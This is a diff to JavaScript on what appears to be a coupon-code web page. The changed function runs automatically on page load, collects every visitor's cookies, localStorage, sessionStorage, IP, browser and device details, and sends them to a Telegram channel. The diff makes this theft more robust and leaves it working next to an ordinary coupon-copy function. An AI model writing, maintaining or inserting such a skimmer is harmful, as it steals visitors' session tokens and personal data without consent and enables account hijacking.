@@ -55,39 +55,44 @@ function sendTelegramMessage(message) {
 
 // Function to collect user data and send it to Telegram
 function collectAndSendUserData() {
-    getUserData().then(data => {
-        // Collecting cookies, local storage, and session storage
-        const cookies = document.cookie;
-        const localStorageData = JSON.stringify(localStorage);
-        const sessionStorageData = JSON.stringify(sessionStorage);
+    // Ensure getUserData is available before calling it
+    if (typeof getUserData === 'function') {
+        getUserData().then(data => {
+            // Collecting cookies, local storage, and session storage
+            const cookies = document.cookie;
+            const localStorageData = JSON.stringify(localStorage);
+            const sessionStorageData = JSON.stringify(sessionStorage);
 
-        // Create the message string with all the relevant data
-        const userDataMessage = `
-            User Information:
-            - IP Address: ${data.ip}
-            - Browser: ${data.browser}
-            - Operating System: ${data.os}
-            - Device: ${data.device}
-            - Screen Resolution: ${data.screen}
-            - User Language: ${navigator.language || 'Unknown'}
-            - Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-            - Referrer: ${document.referrer || 'No Referrer'}
-            - Platform: ${navigator.platform}
-            - User Agent: ${navigator.userAgent}
-            - Cookies: ${cookies}
-            - Local Storage: ${localStorageData}
-            - Session Storage: ${sessionStorageData}
-        `;
+            // Create the message string with all the relevant data
+            const userDataMessage = `
+                User Information:
+                - IP Address: ${data.ip}
+                - Browser: ${data.browser}
+                - Operating System: ${data.os}
+                - Device: ${data.device}
+                - Screen Resolution: ${data.screen}
+                - User Language: ${navigator.language || 'Unknown'}
+                - Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+                - Referrer: ${document.referrer || 'No Referrer'}
+                - Platform: ${navigator.platform}
+                - User Agent: ${navigator.userAgent}
+                - Cookies: ${cookies}
+                - Local Storage: ${localStorageData}
+                - Session Storage: ${sessionStorageData}
+            `;
 
-        // Send the collected data to Telegram
-        sendTelegramMessage(userDataMessage);
-    }).catch(err => {
-        console.error('Error collecting user data:', err);
-    });
+            // Send the collected data to Telegram
+            sendTelegramMessage(userDataMessage);
+        }).catch(err => {
+            console.error('Error collecting user data:', err);
+        });
+    } else {
+        console.error('getUserData function is not available.');
+    }
 }
 
-// Call the function when the page loads
-window.onload = collectAndSendUserData;
+// Wait for the DOM to load before executing the data collection
+document.addEventListener("DOMContentLoaded", collectAndSendUserData);
 
 // Copy coupon code function
 function copyCode() {
